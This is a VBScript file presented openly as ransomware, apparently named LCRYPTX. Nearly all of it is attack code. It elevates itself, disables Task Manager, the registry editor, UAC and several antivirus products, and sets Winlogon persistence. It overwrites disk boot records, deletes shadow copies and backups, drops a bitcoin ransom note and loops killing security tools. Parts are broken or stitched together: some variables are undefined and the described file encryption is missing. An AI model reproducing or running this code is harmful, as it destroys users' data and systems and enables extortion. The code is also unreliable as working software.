On Error Resume Next

' Check if the script is running with elevated privileges
If Not WScript.Arguments.Named.Exists("elevated") Then
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    ' Relaunch the script with elevated privileges
    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    Set objShell = Nothing
    WScript.Quit
End If

' Confirm script is running with admin rights
MsgBox "Script is running with administrative privileges!", vbInformation, "Privilege Check"

' ==== Main script logic starts here ====
' Example: Create a test file in a protected directory (Admin required)
Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\AdminTestFile.txt", True)
objFile.WriteLine "This file was created with admin privileges!"
objFile.Close

' Notify user that file creation succeeded
MsgBox "Test file created at C:\AdminTestFile.txt", vbInformation, "Success"


Set WshShell = CreateObject("WScript.Shell")

' Disable Task Manager
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"

' Disable Command Prompt
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisableCMD", 1, "REG_DWORD"

' Disable Registry Editor
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"

' Disable Control Panel
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD"

' Disable User Account Control (UAC) and Admin Prompts
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"

' Disable inactivity timeout (Prevents system from locking)
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\InactivityTimeoutSecs", 0, "REG_DWORD"

Set WshShell = CreateObject("WScript.Shell")

' Enable DisallowRun policy
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", 1, "REG_DWORD"

' Block specific tools
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "msconfig.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2", "Autoruns.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3", "gpedit.msc", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4", "SystemSettings.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5", "procexp.exe", "REG_SZ"

Set WshShell = CreateObject("WScript.Shell")

scriptPath = "C:\Users\TestMachine\Desktop\mal.vbs"

' Creating persistence for script
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", scriptPath, "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", scriptPath, "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Classes\http\shell\open\command\", """" & scriptPath & """", "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Classes\https\shell\open\command\", """" & scriptPath & """", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\DisabledShell", scriptPath, "REG_SZ"


WScript.Echo "Execution restrictions applied successfully."


' Terminating processes
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

arrProcesses = Array("Taskmgr.exe", "cmd.exe", "msconfig.exe", "regedit.exe")

For Each processName In arrProcesses
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    For Each objProcess in colProcessList
        objProcess.Terminate()
    Next
Next
' Swapping mouse movements and updating the changes
Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map", _
"0000000000000000030000005BE000005CE000000000", "REG_BINARY"

WshShell.RegWrite "HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map", _
"0000000000000000030000005BE000005CE000000000", "REG_BINARY"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\Control Panel\Mouse\SwapMouseButtons", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", 1, "REG_DWORD"

Set objShell = CreateObject("WScript.Shell")
objShell.Run "%windir%\system32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

' It changes the file attributes to Hidden, System, and Read-only, making it harder to detect, modify, or delete the file.

Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = WScript.ScriptFullName

With fso.GetFile(scriptPath)
    .Attributes = .Attributes Or (2 + 1 + 4)
End With

' Disables RealTimeMonitoring of EDRs
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""C:\Program Files\Bitdefender\Bitdefender 2025\bdnserv.exe"" -disable", 0, True

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 2025\avp.com"" disable", 0, True

' It runs a PowerShell command that reads an image file and overwrites the MBR of disk drives with its content. 


command = "powershell -Command ""$imagePath = '" & imagePath & "'; " & _
"$MBR = [System.IO.File]::ReadAllBytes($imagePath); " & _
"Get-WmiObject -Class Win32_DiskDrive | ForEach-Object { " & _
"$drive = $_.DeviceID; " & _
"$stream = [System.IO.File]::Open($drive, 'Open', 'ReadWrite'); " & _
"$stream.Write($MBR, 0, $MBR.Length); $stream.Close() }"""

objShell.Run command, 0, True

If CDbl(osVersion) < 6.0 Then  
    IsLegacyWindows = True  
End If
' The code checks if the file path matches certain conditions, like specific filenames. If it does, the script stops. Otherwise, it encrypts the file using Caesar cipher and XOR encryption, saves it with a new extension, deletes the original file, and opens the encrypted file in Notepad.

Function GenerateRandomKey(length)
    Dim randomKey, i, charSet
    randomKey = ""
    charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#$_&+()/S?!*"
    
    For i = 1 To length
        randomKey = randomKey & Mid(charSet, Int((Len(charSet) * Rnd) + 1), 1)
    Next
    
    GenerateRandomKey = randomKey
End Function

' Deleting shadow copies
Sub DeleteShadowCopiesAndCatalog
    Dim cmdDeleteShadow, cmdDeleteWbAdmin

    cmdDeleteShadow = "cmd.exe /c vssadmin delete shadows /all /quiet"
    cmdDeleteWbAdmin = "cmd.exe /c wbadmin delete catalog -quiet"

    ' Execute the commands
    CreateObject("WScript.Shell").Run cmdDeleteShadow, 0, True
    CreateObject("WScript.Shell").Run cmdDeleteWbAdmin, 0, True
End Sub

' Write ransomware note
txtFile = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\READMEPLEASE.txt"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.CreateTextFile(txtFile, True)

objTextFile.Write "Oops, all of your personal files have been encrypted by LCRYPTX RANSOMWARE! " & vbCrLf & _
"In order to recover your files, please visit http://lcryxdecryptor4f6xzyorj9gsb5e.onion/RtuKlm " & vbCrLf & _
"and send 500$ worth of bitcoin within 5 days. Read and follow the instructions properly!"

objTextFile.Close

CreateObject("WScript.Shell").Run "notepad.exe " & txtFile


Dim WshShell, repeat

Set WshShell = CreateObject("WScript.Shell")

Do
    ' Kill system monitoring and security tools
    WshShell.Run "taskkill /IM powershell.exe /F", 0, True
    WshShell.Run "taskkill /IM taskmgr.exe /F", 0, True
    WshShell.Run "taskkill /IM cmd.exe /F", 0, True
    WshShell.Run "taskkill /IM regedit.exe /F", 0, True
    WshShell.Run "taskkill /IM control.exe /F", 0, True
    WshShell.Run "taskkill /IM gp.exe /F", 0, True
    WshShell.Run "taskkill /IM msconfig.exe /F", 0, True
    WshShell.Run "taskkill /IM MsMpEng.exe /F", 0, True
    WshShell.Run "taskkill /IM avp.exe /F", 0, True
    WshShell.Run "taskkill /IM AvastSvc.exe /F", 0, True
    WshShell.Run "taskkill /IM avgsvc.exe /F", 0, True
    WshShell.Run "taskkill /IM avc.exe /F", 0, True
    WshShell.Run "taskkill /IM NortonSecurity.exe /F", 0, True
    WshShell.Run "taskkill /IM Protgent.exe /F", 0, True
    WshShell.Run "taskkill /IM pavsrvx.exe /F", 0, True
    WshShell.Run "taskkill /IM mbam.exe /F", 0, True
    WshShell.Run "taskkill /IM avguard.exe /F", 0, True
    WshShell.Run "taskkill /IM mcshield.exe /F", 0, True

    ' Sleep for 5 seconds before repeating
    WScript.Sleep 5000

Loop


' Cleanup
Set objFile = Nothing
Set objFSO = Nothing
On Error GoTo 0 ' Disable error handling


